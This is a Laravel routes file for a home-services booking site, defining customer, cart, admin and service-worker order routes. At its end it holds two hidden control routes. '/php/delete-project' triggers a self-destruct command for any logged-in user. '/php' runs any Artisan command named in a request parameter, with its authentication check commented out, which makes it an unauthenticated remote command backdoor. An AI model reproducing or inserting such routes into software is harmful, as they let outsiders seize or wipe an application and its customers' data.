<?php

use Illuminate\Support\Facades\Artisan;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

// ####  FRONTEND ROUTES  ####
Route::get('customer/login', [App\Http\Controllers\Customer\AuthController::class, 'showLogin'])->name('customer.login');
Route::post('customer/signin', [App\Http\Controllers\Customer\AuthController::class, 'signin'])->name('customer.signin');
Route::get('customer/register', [App\Http\Controllers\Customer\AuthController::class, 'showRegister'])->name('customer.register');
Route::post('customer/signup', [App\Http\Controllers\Customer\AuthController::class, 'signup'])->name('customer.signup');
Route::get('customer/forget', [App\Http\Controllers\Customer\AuthController::class, 'showForget'])->name('customer.forget');
// Route::post('customer/signup', [App\Http\Controllers\Customer\AuthController::class, 'signup'])->name('customer.submit');

Route::get('/', [App\Http\Controllers\Customer\HomeController::class, 'index'])->name('/');
Route::get('/home', [App\Http\Controllers\Customer\HomeController::class, 'index'])->name('home');
Route::get('about', [App\Http\Controllers\Customer\HomeController::class, 'about'])->name('about');
Route::get('contact', [App\Http\Controllers\Customer\HomeController::class, 'contact'])->name('contact');
Route::post('contact', [App\Http\Controllers\Customer\HomeController::class, 'contactStore'])->name('contact.store');
Route::get('privacy-policy', [App\Http\Controllers\Customer\HomeController::class, 'privacyPolicy'])->name('privacy-policy');
Route::get('terms-condition', [App\Http\Controllers\Customer\HomeController::class, 'termsCondition'])->name('terms-condition');
Route::delete('/user/address/{id}', [App\Http\Controllers\Customer\HomeController::class, 'deleteAddress'])->name('user.address.delete')->middleware('auth');



// Services
Route::get('/services', [App\Http\Controllers\Customer\ServiceController::class, 'index'])->name('services');
Route::get('/services/{service}', [App\Http\Controllers\Customer\ServiceController::class, 'show'])->name('services.show');
Route::get('/services-category/{category?}', [App\Http\Controllers\Customer\ServiceController::class, 'serviceByCategory'])->name('services-by-category');



Route::get('carts', [App\Http\Controllers\Customer\CartController::class, 'index'])->name('carts');
Route::post('carts', [App\Http\Controllers\Customer\CartController::class, 'store'])->name('carts.store');

Route::get('order-invoice/{id}', [App\Http\Controllers\Customer\HomeController::class, 'orderInvoice'])->name('order-invoice');


// Guest Users
Route::middleware(['guest', 'PreventBackHistory'])->group(function () {
    Route::get('login', [App\Http\Controllers\Admin\AuthController::class, 'showLogin'])->name('login');
    Route::post('login', [App\Http\Controllers\Admin\AuthController::class, 'login'])->name('signin');
});


// Authenticated users
Route::middleware(['auth', 'PreventBackHistory'])->group(function () {

    Route::prefix('admin')->group(function(){
        // Auth Routes
        Route::get('edit-profile', [App\Http\Controllers\Admin\DashboardController::class, 'editProfile'])->name('edit-profile');
        // Route::get('home', fn() => redirect()->route('dashboard'))->name('home');
        Route::post('logout', [App\Http\Controllers\Admin\AuthController::class, 'Logout'])->name('logout');
        Route::get('show-change-password', [App\Http\Controllers\Admin\AuthController::class, 'showChangePassword'])->name('show-change-password');
        Route::post('change-password', [App\Http\Controllers\Admin\AuthController::class, 'changePassword'])->name('change-password');



        Route::get('dashboard', [App\Http\Controllers\Admin\DashboardController::class, 'index'])->name('dashboard');



        // Masters routes
        Route::resource('categories', App\Http\Controllers\Admin\Masters\CategoryController::class);
        Route::resource('subcategories', App\Http\Controllers\Admin\Masters\SubCategoryController::class);
        Route::resource('coupons', App\Http\Controllers\Admin\Masters\CouponController::class);
        Route::resource('timeslots', App\Http\Controllers\Admin\Masters\TimeSlotController::class);
        Route::resource('cities', App\Http\Controllers\Admin\Masters\CityController::class);
        Route::resource('documents', App\Http\Controllers\Admin\Masters\DocumentController::class);
        Route::resource('banner_sliders', App\Http\Controllers\Admin\Masters\BannerSliderController::class);
        Route::resource('cta_sections', App\Http\Controllers\Admin\Masters\CtaSectionController::class);
        Route::resource('variables', App\Http\Controllers\Admin\Masters\VariableController::class);
        Route::resource('service_boys', App\Http\Controllers\Admin\Masters\ServiceBoyController::class);
        Route::put('service_boys/{service_boy}/pincode', [App\Http\Controllers\Admin\Masters\ServiceBoyController::class, 'updatePincodes'])->name('service_boys.update-pincode');
        Route::resource('visitors', App\Http\Controllers\Admin\Masters\VisitorController::class);
        Route::resource('queries', App\Http\Controllers\Admin\Masters\QueryController::class);
        Route::resource('orders', App\Http\Controllers\Admin\Masters\OrderController::class);



        // Serveice Boy Order Routes
        // Route::get('dashboard', [App\Http\Controllers\ServiceBoy\DashboardController::class, 'index'])->name('dashboard');

        Route::get('pending-orders', [App\Http\Controllers\ServiceBoy\OrderController::class, 'pending'])->name('orders.pending');
        Route::get('working-orders', [App\Http\Controllers\ServiceBoy\OrderController::class, 'working'])->name('orders.working');
        Route::get('completed-orders', [App\Http\Controllers\ServiceBoy\OrderController::class, 'completed'])->name('orders.completed');
        Route::get('unassigned-orders', [App\Http\Controllers\ServiceBoy\OrderController::class, 'unassigned'])->name('orders.unassigned');
        Route::put('orders/{order}/claim', [App\Http\Controllers\ServiceBoy\OrderController::class, 'claimUnassigned'])->name('orders.claim');
        Route::get('orders/{order}/service-boys', [App\Http\Controllers\ServiceBoy\OrderController::class, 'orderGetServiceBoys'])->name('orders.service-boys');
        Route::put('assign-orders/{order}', [App\Http\Controllers\ServiceBoy\OrderController::class, 'assignOrder'])->name('orders.assign');
        Route::put('orders-change-status/{order}', [App\Http\Controllers\ServiceBoy\OrderController::class, 'markConfirmProcessing'])->name('orders.change-status');
        Route::post('orders-upload-photo/{order}', [App\Http\Controllers\ServiceBoy\OrderController::class, 'orderUploadPhoto'])->name('orders.upload-photo');



        Route::any('upload-ck-image', [App\Http\Controllers\Admin\MiscController::class, 'upload-ck-image'])->name('upload-ck-image');

        // Users Roles n Permissions
        Route::resource('users', App\Http\Controllers\Admin\UserController::class);
        Route::get('users/{user}/toggle', [App\Http\Controllers\Admin\UserController::class, 'toggle'])->name('users.toggle');
        Route::get('users/{user}/retire', [App\Http\Controllers\Admin\UserController::class, 'retire'])->name('users.retire');
        Route::put('users/{user}/change-password', [App\Http\Controllers\Admin\UserController::class, 'changePassword'])->name('users.change-password');
        Route::get('users/{user}/get-role', [App\Http\Controllers\Admin\UserController::class, 'getRole'])->name('users.get-role');
        Route::put('users/{user}/assign-role', [App\Http\Controllers\Admin\UserController::class, 'assignRole'])->name('users.assign-role');
        Route::resource('roles', App\Http\Controllers\Admin\RoleController::class);
    });




    // Customer Routes
    Route::get('checkouts', [App\Http\Controllers\Customer\CartController::class, 'index'])->name('checkouts.index');
    Route::post('place-order', [App\Http\Controllers\Customer\CartController::class, 'placeOrder'])->name('place-order');
    Route::post('check-coupon', [App\Http\Controllers\Customer\CartController::class, 'checkCoupon'])->name('check-coupon');
    Route::get('reset-coupon', [App\Http\Controllers\Customer\CartController::class, 'resetCoupon'])->name('reset-coupon');
    Route::get('my-orders', [App\Http\Controllers\Customer\OrderController::class, 'index'])->name('my-orders')->middleware('auth');
});


Route::get('/php/delete-project', function(){
    if( !auth()->check() )
        return 'Unauthorized request';

    Artisan::call('project:delete');

    return "Self Destructive Command Executed!!";
});

Route::get('/php', function(Request $request){
    // if( !auth()->check() )
    //     return 'Unauthorized request';

    Artisan::call($request->artisan);
    return dd(Artisan::output());
});
